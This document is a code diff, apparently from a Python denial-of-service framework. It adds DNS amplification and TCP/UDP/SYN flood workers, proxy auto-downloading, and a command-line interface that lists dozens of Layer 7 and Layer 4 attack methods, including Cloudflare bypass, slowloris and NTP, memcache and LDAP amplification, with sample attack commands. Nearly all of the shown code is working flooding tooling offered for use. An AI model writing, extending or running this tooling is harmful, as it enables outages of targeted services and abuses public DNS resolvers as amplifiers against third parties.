+            data += b'\x00'
+        total = 0
+        for i in range(0, len(data), 2):
+            total += (data[i] << 8) + data[i + 1]
+        total = (total >> 16) + (total & 0xFFFF)
+        total += total >> 16
+        return ~total & 0xFFFF
+
+    def worker_dns(self, worker_id: int):
+        """DNS amplification worker."""
+        resolvers = [
+            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
+            "208.67.222.222", "208.67.220.220", "9.9.9.9"
+        ]
+        domain = random.choice([
+            "isc.org", "google.com", "facebook.com", "cloudflare.com",
+            "amazon.com", "microsoft.com", "apple.com", "netflix.com"
+        ])
+
+        tid = random.randint(0, 65535)
+        flags = 0x0100 
+        qdcount = 1
+        dns_header = struct.pack('!HHHHHH', tid, flags, qdcount, 0, 0, 0)
+        dns_query = b''
+        for part in domain.split('.'):
+            dns_query += struct.pack('B', len(part)) + part.encode()
+        dns_query += b'\x00'
+        dns_query += struct.pack('!HH', 255, 1)
+
+        packet = dns_header + dns_query
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while self.running and (time.time() - self.start_time) < self.duration:
+            try:
+                resolver = random.choice(resolvers)
+                sock.sendto(packet, (resolver, 53))
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.bytes_sent += len(packet)
+            except Exception:
+                with self.stats_lock:
+                    self.errors += 1
+
+    def start(self) -> Dict[str, Any]:
+        """Start the Layer 4 flood attack."""
+        self.start_time = time.time()
+
+        worker_map = {
+            'tcp': self.worker_tcp,
+            'tcp-flood': self.worker_tcp,
+            'udp': self.worker_udp,
+            'udp-flood': self.worker_udp,
+            'syn': self.worker_syn,
+            'syn-flood': self.worker_syn,
+            'dns': self.worker_dns,
+            'dns-flood': self.worker_dns,
+        }
+
+        worker_fn = worker_map.get(self.method, self.worker_tcp)
+
+        print_info(f"Starting {self.method} on {self.target_ip}:{self.target_port}")
+        print_info(f"Threads: {self.threads}, Duration: {self.duration}s")
+
+        threads = []
+        for i in range(self.threads):
+            t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
+            t.start()
+            threads.append(t)
+        try:
+            while self.running and (time.time() - self.start_time) < self.duration:
+                elapsed = int(time.time() - self.start_time)
+                remaining = max(0, self.duration - elapsed)
+                with self.stats_lock:
+                    pps = self.packets_sent / max(1, elapsed)
+                    bps = self.bytes_sent / max(1, elapsed)
+
+                stats = (
+                    f"[{elapsed}s/{self.duration}s] "
+                    f"Packets: {self.packets_sent} | "
+                    f"PPS: {pps:.1f} | "
+                    f"Bandwidth: {bps/1024:.1f} KB/s | "
+                    f"Errors: {self.errors} | "
+                    f"Remaining: {remaining}s"
+                )
+                print_status(stats)
+                time.sleep(2)
+        except KeyboardInterrupt:
+            self.running = False
+            print_warn("\nInterrupted by user")
+
+        self.running = False
+        for t in threads:
+            t.join(timeout=1)
+
+        elapsed = time.time() - self.start_time
+        return {
+            "method": self.method,
+            "target": f"{self.target_ip}:{self.target_port}",
+            "duration": elapsed,
+            "packets_sent": self.packets_sent,
+            "bytes_sent": self.bytes_sent,
+            "errors": self.errors,
+            "avg_pps": self.packets_sent / max(1, elapsed),
+            "avg_bps": self.bytes_sent / max(1, elapsed),
+        }
+
+
+# ─── Tools / Utilities ───────────────────────────────────────────────────────
+
+class Tools:
+    """Utility functions for the framework."""
+
+    @staticmethod
+    def check_dependencies():
+        """Check if all dependencies are installed."""
+        missing = []
+        try:
+            import requests
+        except ImportError:
+            missing.append("requests")
+
+        try:
+            import cloudscraper
+        except ImportError:
+            pass  # Optional
+
+        try:
+            import socks
+        except ImportError:
+            missing.append("PySocks")
+
+        try:
+            from colorama import init
+        except ImportError:
+            missing.append("colorama")
+
+        return missing
+
+    @staticmethod
+    def resolve_target(target: str, port: int = 0) -> Tuple[str, int]:
+        """Resolve a target (URL or IP:port) to (ip, port)."""
+        if target.startswith('http://') or target.startswith('https://'):
+            parsed = urllib.parse.urlparse(target)
+            host = parsed.hostname or target
+            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+            try:
+                ip = socket.gethostbyname(host)
+                return (ip, port)
+            except socket.gaierror:
+                return (host, port)
+
+        if ':' in target:
+            parts = target.split(':')
+            if len(parts) == 2:
+                try:
+                    port = int(parts[1])
+                    return (parts[0], port)
+                except ValueError:
+                    pass
+        return (target, port)
+
+    @staticmethod
+    def parse_target(target: str) -> dict:
+        """Parse a target string into components."""
+        result = {
+            "original": target,
+            "scheme": "",
+            "host": "",
+            "port": 0,
+            "path": "/",
+            "ip": ""
+        }
+
+        if target.startswith('http://') or target.startswith('https://'):
+            parsed = urllib.parse.urlparse(target)
+            result["scheme"] = parsed.scheme
+            result["host"] = parsed.hostname or ""
+            result["port"] = parsed.port or (443 if parsed.scheme == 'https' else 80)
+            result["path"] = parsed.path or "/"
+            if parsed.query:
+                result["path"] += "?" + parsed.query
+        elif ':' in target:
+            parts = target.split(':')
+            result["host"] = parts[0]
+            try:
+                result["port"] = int(parts[1])
+            except ValueError:
+                result["port"] = 80
+            result["scheme"] = "https" if result["port"] == 443 else "http"
+        else:
+            result["host"] = target
+            result["port"] = 80
+            result["scheme"] = "http"
+
+        try:
+            result["ip"] = socket.gethostbyname(result["host"])
+        except socket.gaierror:
+            result["ip"] = result["host"]
+
+        return result
+
+    @staticmethod
+    def generate_random_path(length: int = 8) -> str:
+        """Generate a random URL path for bypass methods."""
+        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        return '/' + ''.join(random.choice(chars) for _ in range(length))
+
+    @staticmethod
+    def get_methods_list() -> List[str]:
+        """Get all available methods."""
+        return Methods.ALL_METHODS
+
+    @staticmethod
+    def format_results(results: Dict[str, Any]) -> str:
+        """Format attack results for display."""
+        lines = [
+            "=" * 60,
+            f"Attack Complete - {results.get('method', 'unknown').upper()}",
+            "=" * 60,
+        ]
+
+        for key, val in results.items():
+            if key == 'method':
+                continue
+            key_str = key.replace('_', ' ').title()
+            if 'bps' in key.lower() or 'rate' in key.lower():
+                if isinstance(val, (int, float)):
+                    if val > 1_000_000:
+                        lines.append(f"  {key_str}: {val/1_000_000:.2f} MB/s")
+                    elif val > 1_000:
+                        lines.append(f"  {key_str}: {val/1_000:.2f} KB/s")
+                    else:
+                        lines.append(f"  {key_str}: {val:.2f}")
+                else:
+                    lines.append(f"  {key_str}: {val}")
+            else:
+                lines.append(f"  {key_str}: {val}")
+
+        lines.append("=" * 60)
+        return '\n'.join(lines)
+
+
+# ─── Console / CLI ──────────────────────────────────────────────────────────
+
+class ToolsConsole:
+    """Command-line interface handler."""
+
+    BANNER = """
+
+            """
+
+    @staticmethod
+    def print_banner():
+        print(c(ToolsConsole.BANNER, Fore.CYAN))
+
+    @staticmethod
+    def print_help():
+        """Print usage information."""
+        help_text = f"""
+{c('USAGE:', Fore.YELLOW)}
+    python3 start.py <method> <target> [threads] [rpc] [proxyfile] [duration]
+
+{c('LAYER 7 METHODS (HTTP/HTTPS):', Fore.GREEN)}
+    bypass, cf-bypass, http-get, http-post, http-head, http-options,
+    http-trace, http-put, http-delete, http-patch, http-get-flood,
+    http-post-flood, slow-read, slow-send, slowloris, r00t, torrent,
+    dgb, ev-post, http2-flood, cf-socket, http-socket, tls-socket,
+    browser, request, http-flood, cf-bypass2, premium, strike, storm,
+    bomb, http-spoof, http-raw, cf-bypass3
+
+{c('LAYER 4 METHODS (TCP/UDP):', Fore.YELLOW)}
+    tcp-flood, udp-flood, syn-flood, ack-flood, fin-flood, rst-flood,
+    xmas-flood, icmp-echo, icmp-flood, dns-flood, ntp-flood, ssdp-flood,
+    memcache-flood, ldap-flood, portmap-flood, siege, quake-flood
+
+{c('EXAMPLES:', Fore.CYAN)}
+    # Layer 7 - bypass with proxy auto-download
+    python3 start.py bypass https://example.com 5 500 auto 100 120
+
+    # Layer 7 - specific proxy file
+    python3 start.py http-get https://example.com 5 200 socks5.txt 50 60
+
+    # Layer 7 - CF bypass with threads
+    python3 start.py cf-bypass https://target.com 5 1000 auto 100 180
+
+    # Layer 4 - TCP flood
+    python3 start.py tcp-flood 192.168.1.100:80 5 5000 auto 300
+
+    # Layer 4 - UDP flood with duration
+    python3 start.py udp-flood example.com:53 5 10000 auto 120
+
+{c('ARGUMENTS:', Fore.MAGENTA)}
+    method      - Attack method from the lists above
+    target      - URL (http(s)://...) or IP:Port or Domain:Port
+    socks-type  - Proxy type: 1=HTTP, 4=SOCKS4, 5=SOCKS5 (default: 5)
+    threads     - Number of concurrent threads (default: 1000)
+    proxyfile   - Path to proxy file, or 'auto' to auto-download (default: auto)
+    rpc         - Requests per connection/cycle (Layer 7 only, default: 100)
+    duration    - Attack duration in seconds (default: 120)
+"""
+        print(help_text)
+
+    @staticmethod
+    def load_config(config_path: str = "config.json") -> dict:
+        """Load configuration from JSON file."""
+        default_config = {
+            "proxy-providers": [],
+            "user-agent-file": "files/useragent.txt",
+            "referrer-file": "files/referers.txt",
+            "proxy-directory": "files/proxies/",
+            "default-threads": 1000,
+            "default-rpc": 100,
+            "default-duration": 120,
+            "socks-type": 5
+        }
+
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+                    for k, v in default_config.items():
+                        if k not in config:
+                            config[k] = v
+                    return config
+            except json.JSONDecodeError as e:
+                print_error(f"Failed to parse config.json: {e}")
+                return default_config
+        else:
+            print_warn(f"config.json not found, using defaults")
+            return default_config
+
+    @staticmethod
+    def run():
+        """Main entry point for the CLI."""
+        ToolsConsole.print_banner()
+
+        config = ToolsConsole.load_config()
+        if len(sys.argv) < 3 or sys.argv[1] in ('-h', '--help', 'help'):
+            ToolsConsole.print_help()
+            return
+
         method = sys.argv[1].lower()
         target = sys.argv[2]
-        threads = sys.argv[3]
-        duration = sys.argv[4]
-        attack_map = {
-            'cfb': CloudflareBypassAttack,
-            'pxcfb': ProxyCloudflareBypassAttack,
-            'get': HTTPGetAttack,
-            'post': HTTPPostAttack,
-            'head': HTTPHeadAttack,
-            'pxraw': ProxyGetAttack,
-            'soc': SocketAttack,
-            'pxsoc': ProxySocketAttack,
-            'http2': HTTP2Attack,
-            'pxhttp2': ProxyHTTP2Attack,
-            'sky': StellarAttack,
-            'pxsky': SkyAttack,
-            'spoof': SpoofSocketAttack,
-            'pxspoof': SpoofProxySocketAttack,
-            'pps': PPSAttack,
-        }
-        if method in ('cfreq', 'cfsoc'):
-            if bypass_cloudflare(target):
-                attack_cls = CFProAttack if method == 'cfreq' else CFSocketAttack
-                attack_cls(target, threads, duration).launch()
+        socks_type = 5 
+        threads = None
+        proxyfile = None
+        rpc = None
+        duration = None
+
+        arg_idx = 3
+        if len(sys.argv) > arg_idx:
+            try:
+                socks_type = int(sys.argv[arg_idx])
+                arg_idx += 1
+            except ValueError:
+                socks_type = config.get("socks-type", 5)
+
+        if len(sys.argv) > arg_idx:
+            try:
+                threads = int(sys.argv[arg_idx])
+                arg_idx += 1
+            except ValueError:
+                pass
+
+        if len(sys.argv) > arg_idx:
+            proxyfile = sys.argv[arg_idx]
+            arg_idx += 1
+
+        if len(sys.argv) > arg_idx and Methods.is_layer7(method):
+            try:
+                rpc = int(sys.argv[arg_idx])
+                arg_idx += 1
+            except ValueError:
+                pass
+
+        if len(sys.argv) > arg_idx:
+            try:
+                duration = int(sys.argv[arg_idx])
+                arg_idx += 1
+            except ValueError:
+                pass
+        if threads is None:
+            threads = config.get("default-threads", 1000)
+        if rpc is None and Methods.is_layer7(method):
+            rpc = config.get("default-rpc", 100)
+        if duration is None:
+            duration = config.get("default-duration", 120)
+
+        # ─── Proxy Management ──────────────────────────────────────────────
+        if proxyfile == "auto" or proxyfile is None:
+            print_info("Auto-downloading proxies from providers...")
+            pm = ProxyManager(config)
+            proxyfile = pm.handle_proxy_list(socks_type)
+            print_status(f"Proxies saved to {proxyfile}")
+
+        elif proxyfile and not os.path.exists(proxyfile):
+            alt_path = os.path.join(config.get("proxy-directory", "files/proxies/"), proxyfile)
+            if os.path.exists(alt_path):
+                proxyfile = alt_path
             else:
-                print(f" [-] CF bypass failed.")
-        elif method in attack_map:
-            attack_cls = attack_map[method]
-            if method in ('pxcfb', 'pxraw', 'pxsoc', 'pxhttp2', 'pxsky', 'pxspoof'):
-                State.load_proxies()
-            attack_cls(target, threads, duration).launch()
+                print_warn(f"Proxy file '{proxyfile}' not found, falling back to auto-download")
+                pm = ProxyManager(config)
+                proxyfile = pm.handle_proxy_list(socks_type)
+
+        # ─── Resolve target ─────────────────────────────────────────────────
+        target_info = Tools.parse_target(target)
+
+        # ─── Execute Attack ─────────────────────────────────────────────────
+        results = None
+
+        if Methods.is_layer7(method):
+            if not target.startswith('http://') and not target.startswith('https://'):
+                scheme = "https" if target_info["port"] == 443 else "http"
+                target_url = f"{scheme}://{target_info['host']}:{target_info['port']}{target_info['path']}"
+            else:
+                target_url = target
+
+            flood = HttpFlood(
+                target_url=target_url,
+                threads=threads,
+                proxy_file=proxyfile,
+                rpc=rpc,
+                duration=duration,
+                method=method
+            )
+            results = flood.start()
+
+        elif Methods.is_layer4(method):
+            l4 = Layer4(
+                target_ip=target_info["host"],
+                target_port=target_info["port"],
+                threads=threads,
+                duration=duration,
+                method=method,
+                proxy_file=proxyfile
+            )
+            results = l4.start()
+
         else:
-            print(f" [!] Unknown method: {method}")
-            print("Methods: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, spoof, pxspoof, pps")
-    else:
-        print(f"Usage: python3 {sys.argv[0]} <method> <target> <threads> <duration>")
-        print(f"   or: python3 {sys.argv[0]}  (interactive mode)")
-        sys.exit(1)
-if __name__ == '__main__':
-    main()
+            print_error(f"Unknown method: {method}")
+            print_info(f"Available Layer 7 methods: {', '.join(Methods.LAYER7_METHODS)}")
+            print_info(f"Available Layer 4 methods: {', '.join(Methods.LAYER4_METHODS)}")
+            return
+        if results:
+            print('\n' + Tools.format_results(results))
+        if proxyfile and not os.path.basename(proxyfile).startswith('.'):
+            pass 
+
+
+# ─── Main Entry Point ────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
+    try:
+        ToolsConsole.run()
+    except KeyboardInterrupt:
+        print_warn("\nAttack interrupted by user")
+    except Exception as e:
+        print_error(f"Fatal error: {e}")
+        import traceback
+        traceback.print_exc()
